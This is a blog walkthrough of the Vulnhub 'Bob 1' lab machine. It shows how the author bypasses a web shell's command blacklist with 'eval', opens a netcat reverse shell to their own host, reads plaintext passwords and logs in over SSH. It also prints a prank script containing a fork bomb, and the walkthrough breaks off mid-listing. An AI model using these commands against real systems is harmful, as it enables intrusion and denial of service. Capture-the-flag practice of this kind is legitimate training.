---
layout:     post
title:      "Vulnhub.com - Bob 1"
date:       2018-03-18 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---
Welcome back to another machine from Vulnhub called ***Bob 1***.

{% highlight text %}
Bob is my first CTF VM that I have ever made so be easy on me if it's not perfect.
The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debain. Could there a few weak points in the new unfinished server?
{% endhighlight %}

* Author: [c0rruptedb1t](http://c0rruptedb1t.ddns.net/)
* Download: [http://c0rruptedb1t.ddns.net/vms/bob.html](http://c0rruptedb1t.ddns.net/vms/bob.html)

### Solution

As always we have to get the IP address of the vulnerable machine. Here we can see that it's sitting on `10.0.2.4` address, with 2 open ports - `ftp` and `http`.

{% highlight bash %}
Nmap scan report for 10.0.2.4
Host is up (0.00030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
{% endhighlight %}

So we can just go straight to the `http` service, but in the same time, I decided to run more complex `nmap` scan that will cover all ports.

But to the website.

![Website](/img/bob/web.png){:class="img-responsive center-block"}

After viewing some of the sub pages, I've noticed a comment in the source code.

{% highlight html %}
<!-- If you are the new IT staff I have sent a letter to you about a web shell you can use
-Bob
-->
{% endhighlight %}

In order to enumerate as much as possible, I decided to also note down content from the `contact` page.

{% highlight text %}
IT Dept
Bob J

Phone: +61-021-743-4215
Email: admin@milburghigh.com
Sebastian W

Phone: +61-029-124-6842
Email: seb.w@milburghigh.com
Elliot A

Phone:
Email: elliot.a@protonmail.com
Jospeh C

Phone: +61-029-124-7842
Email: jc@milburghigh.com
{% endhighlight %}

And `login` page.

{% highlight text %}
Complete IT School System Rework

Last week we had a hacker breach our school network and comprise our servers, we are unsure if they stole or leaked anything important, however, we have taken steps to prevent this happening again. We have hired new IT staff to help secure the network and the main school server is only accessible internally. For that reason we have disabled logging in externally until further notice.

-Dean MacDuffy (principle)
{% endhighlight %}

While looking at some of these notes, the previously started `nmap` scan has just ended. Let's take a look at the results.

{% highlight bash %}
root@kali:~#  nmap -p- -v -sS -A -T4 10.0.2.4

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-18 12:20 EDT
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
Initiating ARP Ping Scan at 12:20
Scanning 10.0.2.4 [1 port]
Completed ARP Ping Scan at 12:20, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:20
Completed Parallel DNS resolution of 1 host. at 12:20, 0.00s elapsed
Initiating SYN Stealth Scan at 12:20
Scanning 10.0.2.4 [65535 ports]
Discovered open port 80/tcp on 10.0.2.4
Discovered open port 21/tcp on 10.0.2.4
Discovered open port 25468/tcp on 10.0.2.4
Completed SYN Stealth Scan at 12:20, 6.38s elapsed (65535 total ports)
Initiating Service scan at 12:20
Scanning 3 services on 10.0.2.4
Completed Service scan at 12:20, 6.04s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.0.2.4
NSE: Script scanning 10.0.2.4.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.29s elapsed
Initiating NSE at 12:20
Completed NSE at 12:20, 0.01s elapsed
Nmap scan report for 10.0.2.4
Host is up (0.00055s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD 1.3.5b
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 4 disallowed entries
| /login.php /dev_shell.php /lat_memo.html
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (EdDSA)
MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Uptime guess: 198.048 days (since Fri Sep  1 11:11:48 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 10.0.2.4

NSE: Script Post-scanning.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds
           Raw packets sent: 65570 (2.886MB) | Rcvd: 65588 (2.788MB)
{% endhighlight %}

As you can see, it discovered quite a few things in the webpage, together with a new open port - 25468 running `ssh` service. Let's note that down and move forward.

As the scan showed us that there is `robots.txt` file, we can take a look at it.

{% highlight html %}
User-agent: *
Disallow: /login.php
Disallow: /dev_shell.php
Disallow: /lat_memo.html
Disallow: /passwords.html
{% endhighlight %}

Now we can look at each of these pages. Firstly - passwords.

{% highlight html %}
Really who made this file at least get a hash of your password to display, hackers can't do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. >:(
-Bob
{% endhighlight %}

Memo web page.

{% highlight html %}
Memo sent at GMT+10:00 2:37:42 by User: Bob
Hey guys IT here don't forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.

-Bob
{% endhighlight %}

And finally a dev shell page, containing another comment.

{% highlight html %}
<!-- WIP, don't forget to report any bugs we don't want another breach guys
-Bob -->
{% endhighlight %}

I quickly noticed that there was no possibility to run any commands. But after a few moments there it was, a possibility to run  `echo` command.

{% highlight text %}
echo "test"
test
{% endhighlight %}

After that I checked `eval` command and to my amusement, it works!

{% highlight html %}
eval ls -la


<h5>Output:</h5>
total 1572
drwxr-xr-x 2 root root    4096 Mar  5 04:53 .
drwxr-xr-x 3 root root    4096 Feb 28 19:03 ..
-rw-r--r-- 1 root root      84 Mar  5 04:53 .hint
-rw-r--r-- 1 root root  340400 Mar  4 14:09 WIP.jpg
-rw-r--r-- 1 root root    2588 Mar  4 14:09 about.html
-rw-r--r-- 1 root root    3145 Mar  4 14:09 contact.html
-rw-r--r-- 1 root root    1396 Mar  4 14:09 dev_shell.php
-rw-r--r-- 1 root root    1361 Mar  4 14:09 dev_shell.php.bak
-rw-r--r-- 1 root root 1177950 Mar  4 14:09 dev_shell_back.png
-rw-r--r-- 1 root root    1425 Mar  4 14:09 index.html
-rw-r--r-- 1 root root    1425 Mar  4 14:09 index.html.bak
-rw-r--r-- 1 root root    1925 Mar  4 14:09 lat_memo.html
-rw-r--r-- 1 root root    1560 Mar  4 14:09 login.html
-rw-r--r-- 1 root root    4086 Mar  4 14:09 news.html
-rw-r--r-- 1 root root     687 Mar  5 04:37 passwords.html
-rw-r--r-- 1 root root     111 Mar  4 14:09 robots.txt
-rw-r--r-- 1 root root   26357 Mar  4 14:09 school_badge.png
{% endhighlight %}

Do you see `.hint` file? Let's view it.

{% highlight text %}
Have you tried spawning a tty shell? Also don't forget to check for hidden files ;)
{% endhighlight %}

Now we're certain that the best option would be to create a reverse shell using `netcat`.

{% highlight text %}
eval nc -e /bin/sh 10.0.2.15 1234
{% endhighlight %}
{% highlight bash %}
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
10.0.2.4: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.4] 48628
ls -la
total 1572
drwxr-xr-x 2 root root    4096 Mar  5 04:53 .
drwxr-xr-x 3 root root    4096 Feb 28 19:03 ..
-rw-r--r-- 1 root root      84 Mar  5 04:53 .hint
-rw-r--r-- 1 root root  340400 Mar  4 14:09 WIP.jpg
-rw-r--r-- 1 root root    2588 Mar  4 14:09 about.html
-rw-r--r-- 1 root root    3145 Mar  4 14:09 contact.html
-rw-r--r-- 1 root root    1396 Mar  4 14:09 dev_shell.php
-rw-r--r-- 1 root root    1361 Mar  4 14:09 dev_shell.php.bak
-rw-r--r-- 1 root root 1177950 Mar  4 14:09 dev_shell_back.png
-rw-r--r-- 1 root root    1425 Mar  4 14:09 index.html
-rw-r--r-- 1 root root    1425 Mar  4 14:09 index.html.bak
-rw-r--r-- 1 root root    1925 Mar  4 14:09 lat_memo.html
-rw-r--r-- 1 root root    1560 Mar  4 14:09 login.html
-rw-r--r-- 1 root root    4086 Mar  4 14:09 news.html
-rw-r--r-- 1 root root     687 Mar  5 04:37 passwords.html
-rw-r--r-- 1 root root     111 Mar  4 14:09 robots.txt
-rw-r--r-- 1 root root   26357 Mar  4 14:09 school_badge.png
python -c 'import pty; pty.spawn("/bin/sh")'
$ whoami
whoami
www-data
{% endhighlight %}

Great, we have it! Let's play around and see what files we can find interesting. Firstly, I decide to take a look at the source code of the shell.

{% highlight html %}
$ cat dev_shell.php
cat dev_shell.php
<html>
<body>
  <?php
    //init
    $invalid = 0;
    $command = ($_POST['in_command']);
    $bad_words = array("pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc");
  ?>
  <style>
    #back{
      position: fixed;
      top: 0;
      left: 0;
      min-width: 100%;
      min-height: 100%;
      z-index:-10
    }
      #shell{
        color: white;
        text-align: center;
    }
  </style>
  <!-- WIP, don't forget to report any bugs we don't want another breach guys
  -Bob -->
  <div id="shell">
    <h2>
      dev_shell
    </h2>
    <form action="dev_shell.php" method="post">
      Command: <input type="text" name="in_command" /> <br>
      <input type="submit" value="submit">
    </form>
    <br>
    <h5>Output:</h5>
    <?php
    system("running command...");
      //executes system Command
      //checks for sneaky ;
      if (strpos($command, ';') !==false){
        system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
      }
      else{
        $is_he_a_bad_man = explode(' ', trim($command));
        //checks for dangerous commands
        if (in_array($is_he_a_bad_man[0], $bad_words)){
          system("echo Get out skid lol");
        }
        else{
          system($_POST['in_command']);
        }
      }
    ?>
  </div>
    <img src="dev_shell_back.png" id="back" alt="">
</body>
</html>
{% endhighlight %}

Then I went straight into the user home directories. Let's see them.

{% highlight bash %}
$ cd home
cd home
$ ls -la
ls -la
total 24
drwxr-xr-x  6 root   root   4096 Mar  4 13:45 .
drwxr-xr-x 22 root   root   4096 Mar  5 04:50 ..
drwxr-xr-x 18 bob    bob    4096 Mar  5 04:53 bob
drwxr-xr-x 15 elliot elliot 4096 Feb 27 18:38 elliot
drwxr-xr-x 15 jc     jc     4096 Feb 27 18:20 jc
drwxr-xr-x 15 seb    seb    4096 Mar  5 01:18 seb
{% endhighlight %}

We can start with Bob as he's our hero today.

{% highlight bash %}
$ cd bob
cd bob
$ ls -la
ls -la
total 188
drwxr-xr-x 18 bob  bob   4096 Mar  5 04:53 .
drwxr-xr-x  6 root root  4096 Mar  4 13:45 ..
-rw-------  1 bob  bob    990 Mar  5 04:53 .ICEauthority
-rw-------  1 bob  bob    214 Mar  5 04:53 .Xauthority
-rw-------  1 bob  bob   6366 Mar  5 04:38 .bash_history
-rw-r--r--  1 bob  bob    220 Feb 21 18:10 .bash_logout
-rw-r--r--  1 bob  bob   3548 Mar  5 01:14 .bashrc
drwxr-xr-x  7 bob  bob   4096 Feb 21 18:15 .cache
drwx------  8 bob  bob   4096 Feb 27 17:56 .config
-rw-r--r--  1 bob  bob     55 Feb 21 18:22 .dmrc
drwxr-xr-x  2 bob  bob   4096 Feb 21 19:48 .ftp
drwx------  3 bob  bob   4096 Mar  5 00:45 .gnupg
drwxr-xr-x  3 bob  bob   4096 Feb 21 18:13 .local
drwx------  4 bob  bob   4096 Feb 21 18:13 .mozilla
drwxr-xr-x  2 bob  bob   4096 Mar  4 14:03 .nano
-rw-r--r--  1 bob  bob     72 Mar  5 04:12 .old_passwordfile.html
-rw-r--r--  1 bob  bob    675 Feb 21 18:10 .profile
drwx------  2 bob  bob   4096 Mar  5 02:45 .vnc
-rw-r--r--  1 bob  bob  30922 Mar  5 04:53 .xfce4-session.verbose-log
-rw-r--r--  1 bob  bob  29997 Mar  5 02:56 .xfce4-session.verbose-log.last
-rw-------  1 bob  bob   3165 Mar  5 04:53 .xsession-errors
-rw-------  1 bob  bob   8886 Mar  5 02:56 .xsession-errors.old
drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Desktop
drwxr-xr-x  3 bob  bob   4096 Mar  5 01:02 Documents
drwxr-xr-x  3 bob  bob   4096 Mar  5 00:17 Downloads
drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Music
drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Pictures
drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Public
drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Templates
drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Videos
$ cat .old_passwordfile.html
cat .old_passwordfile.html
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>
{% endhighlight %}

Great, we have the passwords! Now let's look for more clues.

{% highlight bash %}
$ ls -la Downloads
ls -la Downloads
total 728
drwxr-xr-x  3 bob  bob    4096 Mar  5 00:17 .
drwxr-xr-x 18 bob  bob    4096 Mar  5 04:53 ..
-r--r--r--  1 root root     71 Feb 21 19:18 .bobftp.bak
-rwxr-xr-x  1 bob  bob     138 Mar  5 00:03 Hello_Again.py
-rwxr-xr-x  1 bob  bob    7446 Mar  5 00:17 Wheel_Of_Fortune.py
-rwxr-xr-x  1 bob  bob   28692 Nov 30  2010 ftpasswd
drwxr-xr-x 14 bob  bob    4096 Feb 21 18:23 proftpd-1.3.3c
-rw-r--r--  1 bob  bob  681864 Feb 21 18:15 wallpaper.wiki-HD-Bobcat-Wallpaper-PIC-WPB0014118.jpg

$ cat .bobftp.bak
cat .bobftp.bak
bob:$1$Qiy3X9sL$0U5QdO1kxUaU2CrzXAy8W0:1001:1001::/home/bob:/bin/false

$ cat Hello_Again.py
cat Hello_Again.py
#!/usr/bin/python3
import os
import time
from random import *
while True:
    time.sleep(randint(1,10))
    os.system("echo Hello Again")


$ cat Wheel_Of_Fortune.py
cat Wheel_Of_Fortune.py
{% endhighlight %}
{% highlight python %}
#!/usr/bin/python3
#W.I.P
#~c0rruptedb1t
import os
from random import *
from time import sleep
ruinsearchlist = ['fuuny mems', 'safe for work', 'not sus searches', 'hey im 4th!']
ruinsearchlists = ['how to appear funny', 'why are my thumbs uneven', 'am i lack toast and tolerant', 'your youre difference', 'why doesnt my poo float', 'midget google images', 'tall midgets??', 'homemade lube?', 'i hate my boss', 'what counts as fat', 'how to tell partner they fat', 'is it normal to still love my ex', 'how to get back with ex', 'penis remove dog how to', 'romantic ways to propose', 'engagement rings', 'sex shop in my city', 'how to tell if partner cheating', 'ways to kill someone hypothetically', 'undetectable poisons', 'how to delete search history in browser', 'ashley madison hack', 'view ashley madison list', 'ashley madison list my city', 'paternity test', 'mail order paternity test', 'attracted to mother why', 'is incest illegal in this country', 'latest laws incest', 'seduction guide', 'rohypnol safe dosage', 'smelly penis cure urgent', 'common STIs', 'STI test in my city', 'average penis size this country', 'do penis pumps work', 'best budget penis pumps', 'does liking men mean im gay', 'signs of being gay', 'how to come out as gay to dad', 'age of consent here', 'why is age of consent so old here', 'country low age of consent', 'flights philippines', 'isis application form', 'how to join isis', 'cheap syria flights from here', 'syria hotels with pool', 'bing', 'donald trump', 'OH COME ON DONT JUST COPY AND PASTE THE LIST FROM THE ARRAY YOU CHEEKY SCAMP']
ph = ""
echodatastr = ""
wheel = int(-1)

#INIT
os.system("clear")
ph = input("If you want more exciting prizes make sure to run the program as root as some of the prizes need root access as well as an internet connection, I know it sounds pretty dodgey you can look through the source code if you want [to run as root type: 'sudo ./Wheel_Of_Fortune.py'] \n Press Enter To Continue...")
os.system("clear")
print("Making sure you're apt is up to date")
os.system("sudo apt-get update")
os.system("clear")

#Echodata
def echodata():
    global echodatastr
    os.system("echo "+ echodatastr)

#Clearer
def clear():
    os.system("clear")

def pauser():
    ph = input("Press Enter To Continue...")

#Checker
def checker():
    global wheel
    global echodatastr
    if wheel >= 150:
        echodatastr = "You Win"
        echodata()
        wheelspinsecond()
    if wheel <= 149:
        echodatastr = "You Lose"
        echodata()
        wheelspinsecond()

def wheelspinsecond():
    global wheel
    wheel2 = (randint(1,10))
    wheel2str = str(wheel2)
    if wheel >= 50: #WIN
        if wheel2 == 1:
            print("You have won a cow")
            os.system("apt-get moo")
            print("")
            input("Press Enter To Go Back")
        if wheel2 == 2:
            print("Please wait while we check if you have this easter egg, some systems don't")
            os.system("sudo apt install oneko -y")
            clear()
            print("I gave you a ferline buddy, run 'oneko' in a non root user")
            os.system("echo")
            print("")
            pauser()
        if wheel2 == 3:
            os.system("sudo apt install aptitude -y")
            clear()
            os.system("echo Operation: Aptitude Attitude")
            sleep(3)
            print("Waving at aptitude...")
            sleep(3)
            os.system("aptitude moo")
            print("Poking at aptitude...")
            sleep(3)
            os.system("aptitude -v moo")
            print("Shaking aptitude...")
            sleep(3)
            os.system("aptitude -vv moo")
            print("Annoying aptitude...")
            sleep(3)
            os.system("aptitude -vvv moo")
            print("Threatening aptitude...")
            sleep(3)
            os.system("aptitude -vvvv moo")
            print("Blackmailing aptitude...")
            sleep(3)
            os.system("aptitude -vvvvv moo")
            print("Looks at aptitude with puppy eyes...")
            sleep(3)
            os.system("aptitude -vvvvvv moo")
            os.system("echo")
            sleep(1)
            pauser()
        if wheel2 == 4:
            print("You get to watch Star Wars in ascii!")
            ph = input("Press Enter To Start The Show, Ctrl+C to end it")
            clear()
            os.system("telnet towel.blinkenlights.nl")
            pauser()
        if wheel2 == 5:
            os.system("apt install sl")
            clear()
            print("CHOO CHOO!")
            ph = ""
            while ph != "n":
                os.system("sl")
                ph = input("Press Enter To Do The Train Again, otherwise type in 'n' and press enter")
        if wheel2 == 6:
            print("gotta check something real quick...")
            sleep(2)
            os.system("firefox 'http://hasthelargehadroncolliderdestroyedtheworldyet.com/'")
            sleep(2)
            print("*sigh of relief*")
            pauser()
        if wheel2 == 7:
            print("You have been summoned to play some tron")
            os.system("ssh sshtron.zachlatta.com")
            print("")
            pauser()
        if wheel2 == 8:
            print("[WARN] OPTION NOT SET " + wheel2str)
        if wheel2 == 9:
            print("[WARN] OPTION NOT SET " + wheel2str)
        if wheel2 == 10:
            print("[WARN] OPTION NOT SET " + wheel2str)
    if wheel <= 49: #LOSE
        if wheel2 == 1:
            clear()
            os.system("sudo touch /etc/sudoers.d/insultz")
            os.system("sudo echo -e 'Defaults insults' > /etc/sudoers.d/insultz")
            print("Your computer now insults you when you type your sudo password wrong!")
            print("")
            pauser()
        if wheel2 == 2:
            print("Fork Bomb Started, bad luck buddy sucks for you :P")
            os.system(":(){ :|: & };:")
            #print("[WARN] This Prize is manually disabled")
            pauser()
        if wheel2 == 3:
            clear()
            print("You get NOTHING, You Lose NOTHING, Good Day SIR!")
            os.system("firefox 'https://www.amazon.com/Jay-JA0027-Gift-of-Nothing/dp/B019HDSCPU'")
            pauser()
        if wheel2 == 4:
            clear()
            print("0_0")
            os.system("firefox 'http://www.meatswing.com'")
            pauser()
        if wheel2 == 5:
            clear()
            print("Deleted dpkg")
            ph = input("Press Enter To Go Back")
            clear()
            print("Got you right? ;P")
            sleep(3)
        if wheel2 == 6:
            clear()
            print("Hey man you do you, I ain't touching this...") #REPLACE SEARCHES WITH SEARCH URLS
            sleep(1)
            for i in ruinsearchlist:
                os.system("firefox " + i)
                sleep(2)
            pauser()
        if wheel2 == 7:
            print("[WARN] OPTION NOT SET " + wheel2str)
        if wheel2 == 8:
            print("[WARN] OPTION NOT SET " + wheel2str)
        if wheel2 == 9:
            print("[WARN] OPTION NOT SET " + wheel2str)
        if wheel2 == 10:
            print("[WARN] OPTION NOT SET " + wheel2str)

while True:
    wheel = -1
    os.system("echo Welcome to the Wheel Of Fortune, Spin to Win!")
    ph = input("Press Enter To Spin")
    clear()
    wheel = (randint(1,100))
    print(wheel)
    checker()
    sleep(1)
    clear()
{% endhighlight %}

There's a lot of these files, but I don't think they'll be any useful. Let's keep looking.

{% highlight bash %}
cd ../
$ ls -la
ls -la
total 24
drwxr-xr-x  6 root   root   4096 Mar  4 13:45 .
drwxr-xr-x 22 root   root   4096 Mar  5 04:50 ..
drwxr-xr-x 18 bob    bob    4096 Mar  5 04:53 bob
drwxr-xr-x 15 elliot elliot 4096 Feb 27 18:38 elliot
drwxr-xr-x 15 jc     jc     4096 Feb 27 18:20 jc
drwxr-xr-x 15 seb    seb    4096 Mar  5 01:18 seb
$ cd elliot
cd elliot
$ ls -la
ls -la
total 116
drwxr-xr-x 15 elliot elliot  4096 Feb 27 18:38 .
drwxr-xr-x  6 root   root    4096 Mar  4 13:45 ..
-rw-------  1 elliot elliot     0 Feb 27 18:38 .ICEauthority
-rw-------  1 elliot elliot    55 Feb 27 18:21 .Xauthority
-rw-------  1 elliot elliot    25 Feb 27 18:25 .bash_history
-rw-r--r--  1 elliot elliot   220 Feb 27 18:04 .bash_logout
-rw-r--r--  1 elliot elliot  3526 Feb 27 18:04 .bashrc
drwxr-xr-x  7 elliot elliot  4096 Feb 27 18:25 .cache
drwx------  8 elliot elliot  4096 Feb 27 18:37 .config
-rw-r--r--  1 elliot elliot    55 Feb 27 18:21 .dmrc
drwx------  3 elliot elliot  4096 Feb 27 18:21 .gnupg
drwxr-xr-x  3 elliot elliot  4096 Feb 27 18:21 .local
drwx------  4 elliot elliot  4096 Feb 27 18:21 .mozilla
-rw-r--r--  1 elliot elliot   675 Feb 27 18:04 .profile
-rw-r--r--  1 elliot elliot 17258 Feb 27 18:38 .xfce4-session.verbose-log
-rw-------  1 elliot elliot  4486 Feb 27 18:38 .xsession-errors
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:25 Desktop
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:36 Documents
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:25 Downloads
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Music
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Pictures
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Public
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Templates
drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Videos
-rw-r--r--  1 elliot elliot  1509 Feb 27 18:38 theadminisdumb.txt
$ cat theadminisdumb.txt
cat theadminisdumb.txt
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.
{% endhighlight %}

Hmm, that's interesing. But at this moment, I decided to use previously obtain passwords and log in using `ssh`.

{% highlight bash %}
root@kali:~# ssh seb@10.0.2.4 -p 25468
The authenticity of host '[10.0.2.4]:25468 ([10.0.2.4]:25468)' can't be established.
ECDSA key fingerprint is SHA256:6836S02YTRSutf2d8Ay4p5JZKyLjfVMb0O0h4FdycQM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.0.2.4]:25468' (ECDSA) to the list of known hosts.
  __  __ _ _ _                        _____                          
 |  \/  (_) | |                      / ____|                         
 | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __
 | |\/| | | | '_ \| | | | '__/ _` |  \___ \ / _ \ '__\ \ / / _ \ '__|
 | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |   
 |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|   
                              __/ |                                  
                             |___/                                   


seb@10.0.2.4's password:
Linux debian-Lab 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
seb@debian-Lab:~$ cat /etc/passwd
hey n there /etc/passwd
seb@debian-Lab:~$ cat
hey n there
{% endhighlight %}

Why we can't use `cat` command. Luckily `less` is not blocked.

{% highlight bash %}
seb@debian-Lab:~$ less /etc/passwd
c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash
bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
seb:x:1003:1003:Sebastian W,,,:/home/seb:/bin/bash
elliot:x:1004:1004:Elliot A,,,:/home/elliot:/bin/bash
sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
proftpd:x:117:65534::/run/proftpd:/bin/false
ftp:x:118:65534::/srv/ftp:/bin/false
{% endhighlight %}

As I remember something about Bob's strange wallpaper policy, I decided to look for such and check for any hidden information.

{% highlight bash %}
seb@debian-Lab:~/Downloads$ ls -la
total 2984
drwxr-xr-x  2 seb seb    4096 Mar  5 01:16 .
drwxr-xr-x 15 seb seb    4096 Mar  5 01:18 ..
-rw-r--r--  1 seb seb 3046222 Mar  5 01:16 GWUvFch.png
{% endhighlight %}

We can copy it using `scp`.

{% highlight bash %}
root@kali:~# scp -P 25468 seb@10.0.2.4:/home/seb/Downloads/GWUvFch.png ~
  __  __ _ _ _                        _____                          
 |  \/  (_) | |                      / ____|                         
 | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __
 | |\/| | | | '_ \| | | | '__/ _` |  \___ \ / _ \ '__\ \ / / _ \ '__|
 | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |   
 |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|   
                              __/ |                                  
                             |___/                                   


seb@10.0.2.4's password:
GWUvFch.png                                   100% 2975KB  38.8MB/s   00:00
{% endhighlight %}

![Wallpaper](/img/bob/wallpaper.png){:class="img-responsive center-block"}

But that was false alarm as nothing was there. And that's when I decided to go back to Bob. In the `Documents` directory that was something else that I missed during the first time.

{% highlight bash %}
seb@debian-Lab:/home/bob$ cd Documents/
seb@debian-Lab:/home/bob/Documents$ ls -la
total 20
drwxr-xr-x  3 bob bob 4096 Mar  5 01:02 .
drwxr-xr-x 18 bob bob 4096 Mar  5 04:53 ..
-rw-r--r--  1 bob bob   91 Mar  5 00:58 login.txt.gpg
drwxr-xr-x  3 bob bob 4096 Mar  5 00:35 Secret
-rw-r--r--  1 bob bob  300 Mar  4 14:11 staff.txt

seb@debian-Lab:/home/bob/Documents$ less staff.txt
Seb:

Seems to like Elliot
Wants to do well at his job
Gave me a backdoored FTP to instal that apparently Elliot gave him

James:

Does nothing
Pretty Lazy
Doesn't give a shit about his job

Elliot:

Keeps to himself
Always needs to challenge everything I do
Keep an eye on him
Try and get him fired
{% endhighlight %}

Seems like James was the only sane member of this group :D

{% highlight bash %}
seb@debian-Lab:/home/bob/Documents$ cd Secret/
seb@debian-Lab:/home/bob/Documents/Secret$ ls -la
total 12
drwxr-xr-x 3 bob bob 4096 Mar  5 00:35 .
drwxr-xr-x 3 bob bob 4096 Mar  5 01:02 ..
drwxr-xr-x 4 bob bob 4096 Mar  5 00:39 Keep_Out
seb@debian-Lab:/home/bob/Documents/Secret$ cd Keep_Out/
seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out$ ls -la
total 16
drwxr-xr-x 4 bob bob 4096 Mar  5 00:39 .
drwxr-xr-x 3 bob bob 4096 Mar  5 00:35 ..
drwxr-xr-x 3 bob bob 4096 Mar  5 04:43 Not_Porn
drwxr-xr-x 2 bob bob 4096 Mar  5 00:39 Porn
seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out$ cd Not_Porn/
seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn$ ls -la
total 12
drwxr-xr-x 3 bob bob 4096 Mar  5 04:43 .
drwxr-xr-x 4 bob bob 4096 Mar  5 00:39 ..
drwxr-xr-x 2 bob bob 4096 Mar  5 00:50 No_Lookie_In_Here
seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn$ cd No_Lookie_In_Here/
seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ls -la
total 12
